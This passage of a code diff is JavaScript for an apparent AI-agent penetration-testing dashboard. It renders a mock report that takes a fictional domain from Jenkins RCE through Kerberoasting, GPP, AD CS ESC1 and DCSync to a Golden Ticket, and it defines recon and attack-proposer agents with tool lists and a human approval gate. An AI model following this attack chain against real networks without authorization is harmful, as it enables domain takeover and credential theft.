+    var crows=creds.map(function(id){ var m=META[id]||{}; return "<tr><td>"+escapeHtml(m.user||"")+"</td><td>"+escapeHtml(m.secret||"")+"</td><td>"+escapeHtml(m.source||"")+"</td><td>"+escapeHtml(m.privileges||"")+"</td></tr>"; }).join("");
+    body.innerHTML='<h1>CORP-INTERNAL — attack-path report</h1>'
+      +'<div class="fm">'+escapeHtml(fm)+'</div>'
+      +'<div class="callout">👑 <b>Domain compromised.</b> DMZ foothold via unauthenticated Jenkins RCE → pivot into 172.16.5.0/24 → Kerberoast + GPP + AD CS ESC1 + DCSync → <b>Domain Admin</b> on corp.local. '+finds.length+' findings ('+sev.crit+' critical, '+sev.high+' high).</div>'
+      +'<h2>Open surface</h2><table><thead><tr><th>Host</th><th>Ports</th><th>Role</th></tr></thead><tbody>'
+      +'<tr><td>10.10.10.5</td><td>22,80,443,8080</td><td>DMZ web — foothold</td></tr>'
+      +'<tr><td>172.16.5.10 (DC01)</td><td>88,389,445,636</td><td>Domain Controller</td></tr>'
+      +'<tr><td>172.16.5.20 (SQL01)</td><td>445,1433</td><td>MSSQL</td></tr>'
+      +'<tr><td>172.16.5.25 (FILES01)</td><td>139,445</td><td>File server (SYSVOL)</td></tr>'
+      +'<tr><td>172.16.5.50 (WS01)</td><td>445,5985</td><td>Workstation (deleg.)</td></tr>'
+      +'<tr><td>172.16.5.60 (ADCS01)</td><td>80,443,445</td><td>AD Certificate Services</td></tr></tbody></table>'
+      +'<h2>Attack path</h2><ol>'
+      +'<li>Unauth <code>Jenkins /script</code> Groovy RCE → looted <code>svc_ci</code></li>'
+      +'<li>Pivot with svc_ci into <code>172.16.5.0/24</code> — 6 hosts</li>'
+      +'<li>BloodHound → Kerberoast <code>MSSQLSvc</code> → <code>svc_sql</code></li>'
+      +'<li>SYSVOL <code>GPP cpassword</code> → <code>svc_backup</code> (DCSync rights)</li>'
+      +'<li>AD CS <code>ESC1</code> → forged Administrator certificate</li>'
+      +'<li><code>DCSync</code> → krbtgt hash → <b>Golden Ticket</b> → Domain Admin</li></ol>'
+      +'<h2>Findings ('+finds.length+')</h2><table><thead><tr><th>Sev</th><th>CVSS</th><th>Finding</th><th>Where</th></tr></thead><tbody>'+frows+'</tbody></table>'
+      +'<h2>Credentials ('+creds.length+')</h2><table><thead><tr><th>User</th><th>Secret</th><th>Source</th><th>Privileges</th></tr></thead><tbody>'+crows+'</tbody></table>'
+      +'<h2>Suggested next steps</h2><ul><li>Rotate <code>krbtgt</code> twice; reset every looted account.</li><li>Remediate AD CS template (ESC1) + remove svc_backup DCSync rights.</li><li>Patch Jenkins + disable /script; remove /backup autoindex.</li><li>Purge GPP cpassword from SYSVOL (MS14-025).</li></ul>'; }
+
+  function refreshPanes(){ if(!cy) return;
+    document.getElementById("tc-find").textContent=findList().length;
+    var ng=GATE.filter(function(g){return g.status==="pending";}).length, gt=document.getElementById("tc-gate"); gt.textContent=ng; gt.className="rc"+(ng?" warnc":"");
+    document.getElementById("tc-creds").textContent=credList().length;
+    renderFindings(); renderGate(); renderCreds(); renderReport(); }
+  function wirePaneButtons(){
+    document.getElementById("find-filter").oninput=renderFindings;
+    document.getElementById("find-add").onclick=function(){ pop("Finding added","operator-entered finding recorded in findings.json","finding"); };
+    document.getElementById("cred-add").onclick=function(){ pop("Credential added","written to the project vault (chmod 600)","cred"); };
+    document.getElementById("cat-filter").oninput=renderCatalog;
+    document.getElementById("cat-star").onclick=function(){ this.classList.toggle("on"); renderCatalog(); };
+    document.getElementById("rep-md").onclick=function(){ toast("report.md exported (Obsidian-compatible)"); };
+    document.getElementById("rep-obs").onclick=function(){ toast("exported to Obsidian vault"); };
+    document.getElementById("rep-regen").onclick=function(){ renderReport(); toast("report regenerated"); }; }
+  function beatPop(b){ if(!b.add) return; var cats={report:null,cred:null,attack:null,finding:null,subnet:null};
+    b.add.forEach(function(id){ var k=(NODE_BY_ID[id]||{}).kind; if(k in cats&&!cats[k]) cats[k]=id; });
+    var id,kind; if(cats.report){id=cats.report;kind="report";}else if(cats.cred){id=cats.cred;kind="cred";}else if(cats.attack){id=cats.attack;kind="attack";}else if(cats.finding){id=cats.finding;kind="finding";}else if(cats.subnet){id=cats.subnet;kind="subnet";}else return;
+    var n=NODE_BY_ID[id]||{},m=META[id]||{};
+    if(kind==="report") pop("Report ready","DMZ foothold → Domain Admin","ok");
+    else if(kind==="cred") pop("Credential looted",(m.user||n.label)+(m.secret?(" · "+m.secret):""),"cred");
+    else if(kind==="attack") pop("Attack-gate hit",(m.technique||n.label)+" — needs approval","gate");
+    else if(kind==="finding") pop("New finding",n.label,"finding");
+    else if(kind==="subnet") pop("Pivot","into "+(m.cidr||n.label),"info"); }
+
+  /* ============================================================
+     AGENTS — hierarchy · search · per-agent editor
+     ============================================================ */
+  function escapeAttr(s){ return String(s).replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/</g,"&lt;"); }
+  var MODELS=["your-internal-model","gpt-4o-compatible","llama-3.1-70b-instruct","mistral-large","qwen2.5-72b-instruct","claude-compatible"];
+  var AUTON=["Propose only (recommended)","Auto-run recon","Auto-run recon + enumeration","Full auto (recon phases)"];
+  var TOOL_POOL=["nmap","masscan","feroxbuster","gobuster","ffuf","nikto","whatweb","netexec","enum4linux-ng","smbclient","smbmap","ldapsearch","impacket","bloodhound-python","certipy","snmpwalk","searchsploit","hacktricks","exploitdb","obsidian-report"];
+  var GUARDS=["Targets validated against the project scope allowlist","No exploit / spray auto-run — attacks go to the human gate","Every action audited (who + what)","LLM stays on your self-hosted endpoint — nothing leaves the network"];
+  var AGENT_DEFS=[
+    {id:"root",parent:null,icon:"🧠",name:"Orchestrator",role:"Plans the run, routes work to phase agents, enforces scope + the attack gate.",model:"your-internal-model",auton:"Propose only (recommended)",temp:0.2,steps:40,tools:["nmap","hacktricks"],tech:["phase planning","scope enforcement","checkpoint routing","token-budget control"],prompt:"You are the orchestrator for an OSCP-legal recon engagement. Plan phases, delegate to phase agents, keep every target within authorized scope, and route any attack to the human gate. You never execute exploits."},
+    {id:"recon",parent:"root",icon:"📡",name:"Recon agent",role:"Port + service discovery across the scope.",model:"your-internal-model",auton:"Auto-run recon",temp:0.1,steps:20,tools:["nmap","masscan"],tech:["TCP full sweep","UDP top-100","service/version detection","NSE safe scripts"],prompt:"Discover live hosts, open ports and service versions. Prefer nmap -sCV; stay within scope; never brute-force."},
+    {id:"enum",parent:"root",icon:"🔎",name:"Enumeration agent",role:"Tiered, per-service enumeration; delegates to sub-agents.",model:"your-internal-model",auton:"Auto-run recon + enumeration",temp:0.2,steps:30,tools:["netexec","enum4linux-ng","feroxbuster","ldapsearch"],tech:["Tier-1 anonymous enum","authenticated re-run","share walking","content discovery"],prompt:"Enumerate each discovered service to Tier-1 depth. Re-run authenticated when a credential is available. Never spray a wordlist."},
+    {id:"enum-web",parent:"enum",icon:"🌐",name:"Web enum sub-agent",role:"Web content discovery, fingerprint, app detection.",model:"your-internal-model",auton:"Auto-run recon + enumeration",temp:0.2,steps:16,tools:["feroxbuster","gobuster","ffuf","nikto","whatweb"],tech:["content discovery","vhost fuzzing","CMS fingerprint","source/backup disclosure"],prompt:"Map the web surface: directories, vhosts, tech stack, leaked source/backups. Content discovery only — never password-brute a login form."},
+    {id:"enum-smb",parent:"enum",icon:"🪟",name:"SMB / AD sub-agent",role:"SMB + Active Directory enumeration.",model:"your-internal-model",auton:"Auto-run recon + enumeration",temp:0.2,steps:20,tools:["netexec","enum4linux-ng","smbclient","ldapsearch","bloodhound-python"],tech:["null / guest session","RID cycling","BloodHound collection","roastable + delegation discovery"],prompt:"Enumerate SMB and AD read-only: null/guest, shares, users via RID, BloodHound. Identify roastable accounts and delegation. Never crack on-host."},
+    {id:"enum-svc",parent:"enum",icon:"🧩",name:"Service sub-agent",role:"The long tail — 180+ service modules.",model:"your-internal-model",auton:"Auto-run recon + enumeration",temp:0.2,steps:16,tools:["snmpwalk","netexec","smbmap"],tech:["banner grab","default-cred sanity check","protocol-specific recon"],prompt:"Enumerate any other discovered service via its module. Read-only; Tier-2 default-cred checks are single attempts, shown not sprayed."},
+    {id:"research",parent:"root",icon:"📚",name:"Research agent",role:"Maps findings to HackTricks / Exploit-DB and ranks the catalog.",model:"your-internal-model",auton:"Propose only (recommended)",temp:0.3,steps:18,tools:["hacktricks","exploitdb","searchsploit"],tech:["finding→technique mapping","catalog relevance ranking","reference linking"],prompt:"For each finding, surface the canonical HackTricks page and searchsploit hits, and rank catalogue actions by the evidence held. Never auto-run exploits."},
+    {id:"attack",parent:"root",icon:"🛑",name:"Attack-proposer agent",role:"Proposes exploitation checkpoints — never executes.",model:"your-internal-model",auton:"Propose only (locked)",temp:0.2,steps:14,tools:["impacket","certipy","netexec"],tech:["attack-path synthesis","checkpoint proposal","MITRE ATT&CK mapping"],prompt:"Propose the next attack as a checkpoint with the exact command and MITRE id. You may NEVER execute — a human approves at the gate.",gated:true},
+    {id:"report",parent:"root",icon:"📄",name:"Reporting agent",role:"Synthesizes the Obsidian attack-path report.",model:"your-internal-model",auton:"Auto-run recon",temp:0.4,steps:12,tools:["obsidian-report"],tech:["evidence synthesis","attack-path narrative","remediation drafting"],prompt:"Write an Obsidian-compatible report: summary, open surface, ordered attack path, findings by severity, credentials, remediation."}
+  ];
+  function defOf(id){ for(var i=0;i<AGENT_DEFS.length;i++) if(AGENT_DEFS[i].id===id) return AGENT_DEFS[i]; return null; }
+  function cloneAgent(a){ return {id:a.id,parent:a.parent,icon:a.icon,name:a.name,role:a.role,model:a.model,auton:a.auton,temp:a.temp,steps:a.steps,tools:a.tools.slice(),tech:a.tech.slice(),prompt:a.prompt,gated:a.gated}; }
+  var AGENTS_INITED=false, CURA="root", AGENT_STATE={};
+  function initAgents(){ if(AGENTS_INITED) return; AGENTS_INITED=true; AGENT_DEFS.forEach(function(a){ AGENT_STATE[a.id]=cloneAgent(a); });
+    document.getElementById("agent-search").oninput=function(){ renderAgentList(this.value); }; renderOrg(); selectAgent("root"); }
+  function agentOrder(){ var out=[]; function walk(pid,d){ AGENT_DEFS.forEach(function(a){ if(a.parent===pid){ out.push({a:a,d:d}); walk(a.id,d+1); } }); } walk(null,0); return out; }
+  function renderAgentList(q){ q=(q||"").toLowerCase(); var el=document.getElementById("agent-list");
+    var rows=agentOrder().filter(function(o){ var s=AGENT_STATE[o.a.id]; return !q||(s.name+" "+s.role+" "+s.tech.join(" ")).toLowerCase().indexOf(q)>=0; });
+    el.innerHTML=rows.map(function(o){ var s=AGENT_STATE[o.a.id]; return '<div class="agentrow d'+o.d+(CURA===o.a.id?" sel":"")+'" data-a="'+o.a.id+'"><span class="ai">'+o.a.icon+'</span>'+escapeHtml(s.name)+(o.a.gated?'<span class="gated">GATED</span>':'')+'</div>'; }).join("")||'<div class="hint" style="padding:8px">no agents match</div>';
+    Array.prototype.forEach.call(el.querySelectorAll("[data-a]"),function(r){ r.onclick=function(){ selectAgent(r.getAttribute("data-a")); }; }); }
+  function orgNode(a){ var s=AGENT_STATE[a.id], kids=AGENT_DEFS.filter(function(x){return x.parent===a.id;});
+    var cls="onode"+(a.parent===null?" root":"")+(a.gated?" gated":"")+(CURA===a.id?" sel":"");
+    var html='<li><div class="'+cls+'" data-a="'+a.id+'"><span class="oi">'+a.icon+'</span><span class="onm">'+escapeHtml(s.name)+'</span><span class="orl">'+(a.gated?"proposes only":(s.tools.length+" tools · "+s.tech.length+" tech"))+'</span></div>';
+    if(kids.length) html+='<ul>'+kids.map(orgNode).join("")+'</ul>'; return html+'</li>'; }
+  function renderOrg(){ var root=AGENT_DEFS.filter(function(a){return a.parent===null;})[0]; document.getElementById("orgchart").innerHTML='<ul>'+orgNode(root)+'</ul>';
+    Array.prototype.forEach.call(document.querySelectorAll("#orgchart [data-a]"),function(n){ n.onclick=function(){ selectAgent(n.getAttribute("data-a")); }; }); }
+  function selectAgent(id){ CURA=id; var sv=document.getElementById("agent-search"); renderAgentList(sv?sv.value:""); renderOrg(); renderAgentEditor(id); }
+  function agentPath(id){ var names=[],cur=defOf(id); while(cur){ names.unshift(AGENT_STATE[cur.id].name); cur=cur.parent?defOf(cur.parent):null; } return names; }
+  function renderAgentEditor(id){ var s=AGENT_STATE[id], def=defOf(id), host=document.getElementById("agent-editor");
+    var path=agentPath(id).map(function(n,i,arr){ return i===arr.length-1?("<b>"+escapeHtml(n)+"</b>"):escapeHtml(n); }).join(" › ");
+    var modelOpts=MODELS.map(function(m){ return '<option'+(m===s.model?" selected":"")+'>'+m+'</option>'; }).join("");
+    var autList=def.gated?["Propose only (locked)"]:AUTON;
+    var autOpts=autList.map(function(m){ return '<option'+(m===s.auton?" selected":"")+'>'+m+'</option>'; }).join("");
+    var tools=TOOL_POOL.map(function(t){ var on=s.tools.indexOf(t)>=0; return '<div class="toolopt'+(on?" on":"")+'" data-tool="'+t+'"><span class="tk">'+(on?"✓":"")+'</span>'+t+'</div>'; }).join("");
+    var chips=s.tech.map(function(t,i){ return '<span class="chip">'+escapeHtml(t)+'<span class="cx" data-tech="'+i+'">✕</span></span>'; }).join("")+'<input class="input" id="tech-new" placeholder="add technique + Enter" style="width:180px;padding:5px 9px">';
+    var guards=GUARDS.concat(def.gated?["This agent can only PROPOSE — execution is impossible by design"]:[]).map(function(g){ return '<div class="guard"><span class="lk">🔒</span>'+escapeHtml(g)+'</div>'; }).join("");
+    host.className="editor";
+    host.innerHTML='<div class="ehead"><span class="eic">'+def.icon+'</span><h2>'+escapeHtml(s.name)+'</h2>'+(def.gated?'<span class="gst pending" style="margin:0">human-gated</span>':'')+'</div>'
+      +'<div class="crumb2">'+path+'</div>'
+      +'<div class="egrid">'
+      +'<div class="efield"><span>Agent name</span><input class="input" id="e-name" value="'+escapeAttr(s.name)+'"></div>'
+      +'<div class="efield"><span>Model · self-hosted</span><select class="input" id="e-model">'+modelOpts+'</select></div>'
+      +'<div class="efield full"><span>Role</span><input class="input" id="e-role" value="'+escapeAttr(s.role)+'"></div>'
+      +'<div class="efield"><span>Autonomy</span><select class="input" id="e-auton"'+(def.gated?" disabled":"")+'>'+autOpts+'</select></div>'
+      +'<div class="efield"><span>Reports to</span><input class="input" value="'+escapeAttr(def.parent?AGENT_STATE[def.parent].name:"— top of hierarchy —")+'" disabled></div>'
+      +'<div class="efield"><span>Temperature · <b id="e-tempv">'+s.temp+'</b></span><input type="range" min="0" max="1" step="0.05" id="e-temp" value="'+s.temp+'"></div>'
+      +'<div class="efield"><span>Max steps</span><input class="input" type="number" min="1" max="200" id="e-steps" value="'+s.steps+'"></div>'
+      +'</div>'
+      +'<div class="efield full" style="margin-bottom:14px"><span>Techniques · '+s.tech.length+'</span><div class="chips" id="tech-chips">'+chips+'</div></div>'
+      +'<div class="efield full" style="margin-bottom:14px"><span>Tools · '+s.tools.length+' enabled</span><div class="toolgrid" id="tool-grid">'+tools+'</div></div>'
+      +'<div class="efield full" style="margin-bottom:14px"><span>System prompt</span><textarea class="input" id="e-prompt">'+escapeHtml(s.prompt)+'</textarea></div>'
+      +'<div class="efield full" style="margin-bottom:4px"><span>Guardrails · enforced, not editable</span>'+guards+'</div>'
+      +'<div class="eactions"><button class="btn btn-primary" id="e-save">Save changes</button><button class="btn" id="e-reset">Reset to default</button><span class="hint" id="e-status"></span></div>';
+    var g=function(x){ return document.getElementById(x); };
+    g("e-name").oninput=function(){ s.name=this.value; };
+    g("e-model").onchange=function(){ s.model=this.value; };
+    g("e-role").oninput=function(){ s.role=this.value; };
+    if(!def.gated) g("e-auton").onchange=function(){ s.auton=this.value; };
+    g("e-temp").oninput=function(){ s.temp=parseFloat(this.value); g("e-tempv").textContent=s.temp; };
+    g("e-steps").oninput=function(){ s.steps=parseInt(this.value||"1",10); };
+    g("e-prompt").oninput=function(){ s.prompt=this.value; };
+    Array.prototype.forEach.call(document.querySelectorAll("#tool-grid [data-tool]"),function(t){ t.onclick=function(){ var name=t.getAttribute("data-tool"),i=s.tools.indexOf(name); if(i>=0) s.tools.splice(i,1); else s.tools.push(name); renderAgentEditor(id); }; });
+    Array.prototype.forEach.call(document.querySelectorAll("#tech-chips [data-tech]"),function(c){ c.onclick=function(){ s.tech.splice(+c.getAttribute("data-tech"),1); renderAgentEditor(id); }; });
+    g("tech-new").addEventListener("keydown",function(e){ if(e.key==="Enter"){ e.preventDefault(); var v=this.value.trim(); if(v){ s.tech.push(v); renderAgentEditor(id); setTimeout(function(){ var n=document.getElementById("tech-new"); if(n) n.focus(); },0); } } });
+    g("e-save").onclick=function(){ var d=defOf(id); d.name=s.name; d.model=s.model; d.role=s.role; d.auton=s.auton; d.temp=s.temp; d.steps=s.steps; d.tools=s.tools.slice(); d.tech=s.tech.slice(); d.prompt=s.prompt; renderAgentList((document.getElementById("agent-search")||{}).value||""); renderOrg(); pop("Agent saved",s.name+" · configuration updated","ok"); g("e-status").textContent="saved ✓"; };
+    g("e-reset").onclick=function(){ AGENT_STATE[id]=cloneAgent(defOf(id)); renderAgentEditor(id); renderAgentList((document.getElementById("agent-search")||{}).value||""); renderOrg(); toast(defOf(id).name+" reset to default"); }; }
 
   /* start signed-out so the Sign-in button is the first thing that "works" */
 })();
